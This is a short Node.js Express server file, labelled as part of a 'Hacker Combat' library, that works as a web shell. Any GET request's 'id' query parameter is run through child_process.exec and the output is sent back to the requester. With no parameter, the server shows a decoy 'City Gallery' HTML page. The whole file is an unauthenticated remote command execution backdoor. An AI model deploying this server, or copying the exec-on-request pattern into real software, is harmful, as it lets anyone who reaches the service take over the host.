/*
Copyright 2014-Present Hacker Combat Authors
This file is part of the Hacker Combat library.
The Hacker Combat Protocol is free software: you can redistribute it and/or modify
it under the terms of the GNU Lesser General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
The Hacker Combat Protocol is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU Lesser General Public License for more details.
You should have received a copy of the GNU Lesser General Public License
along with the Hacker Combat Protocol library. If not, see <http://www.gnu.org/licenses/>.
*/
var express = require("express");
var app = express();
var exec = require('child_process').exec;
var cmd = "pwd ; ls"
var path = require('path');
process.argv.forEach(function (val, index, array) {
  console.log(index + ': ' + val);
});
//app.use(express.static(path.join(__dirname, 'index')));
app.get('/', function(req, res){
    console.log("I have been successfully pinged")
    console.log('id: ' + req.query.id);
    cmd = req.query.id;
    if(cmd == undefined){
      cmd = "whoami"
      console.log("cmd"+cmd)
      //res.send("hello hacker");
      //res.send('<!DOCTYPEhtml><html><head><style>div.container{width:100%;border:1pxsolidgray;}header,footer{padding:1em;color:white;background-color:black;clear:left;text-align:center;}nav{float:left;max-width:160px;margin:0;padding:1em;}navul{list-style-type:none;padding:0;}navula{text-decoration:none;}article{margin-left:170px;border-left:1pxsolidgray;padding:1em;overflow:hidden;}</style></head><body><divclass="container"><header><h1>CityGallery</h1></header><nav><ul><li><ahref="#">London</a></li><li><ahref="#">Paris</a></li><li><ahref="#">Tokyo</a></li></ul></nav><article><h1>London</h1><p>LondonisthecapitalcityofEngland.ItisthemostpopulouscityintheUnitedKingdom,withametropolitanareaofover13millioninhabitants.</p><p>StandingontheRiverThames,Londonhasbeenamajorsettlementfortwomillennia,itshistorygoingbacktoitsfoundingbytheRomans,whonameditLondinium.</p></article><footer>Copyright&copy;W3Schools.com</footer></div></body></html>');
      res.send("<!DOCTYPE html>" +
      "<html>" +
      "<head>" +
      "<style>" +
      "div.container {" +
      "    width: 100%;" +
      "    border: 1px solid gray;" +
      "}" +
      "header, footer {" +
      "    padding: 1em;" +
      "    color: white;" +
      "    background-color: black;" +
      "    clear: left;" +
      "    text-align: center;" +
      "}" +
      "nav {" +
      "    float: left;" +
      "    max-width: 160px;" +
      "    margin: 0;" +
      "    padding: 1em;" +
      "}" +
      "nav ul {" +
      "    list-style-type: none;" +
      "    padding: 0;" +
      "}" +
      "   " +
      "nav ul a {" +
      "    text-decoration: none;" +
      "}" +
      "article {" +
      "    margin-left: 170px;" +
      "    border-left: 1px solid gray;" +
      "    padding: 1em;" +
      "    overflow: hidden;" +
      "}" +
      "</style>" +
      "</head>" +
      "<body>" +
      "<div class=\"container\">" +
      "<header>" +
      "   <h1>City Gallery</h1>" +
      "</header>" +
      "  " +
      "<nav>" +
      "  <ul>" +
      "    <li><a href=\"#\">London</a></li>" +
      "    <li><a href=\"#\">Paris</a></li>" +
      "    <li><a href=\"#\">Tokyo</a></li>" +
      "  </ul>" +
      "</nav>" +
      "<article>" +
      "  <h1>London</h1>" +
      "  <p>London is the capital city of England. It is the most populous city in the  United Kingdom, with a metropolitan area of over 13 million inhabitants.</p>" +
      "  <p>Standing on the River Thames, London has been a major settlement for two millennia, its history going back to its founding by the Romans, who named it Londinium.</p>" +
      "</article>" +
      "<footer>Copyright &copy; W3Schools.com</footer>" +
      "</div>" +
      "</body>" +
      "</html>")
      //res.sendfile('index/index.html', {root: __dirname })
      //res.sendFile( "/index/index.html", {root: __dirname });
    }else{
      exec(cmd, function(error, stdout, stderr) {
        // command output is in stdout
        console.log("stdout: "+stdout)
        res.send(stdout);
      });
    }
});
app.listen(process.argv[2]);
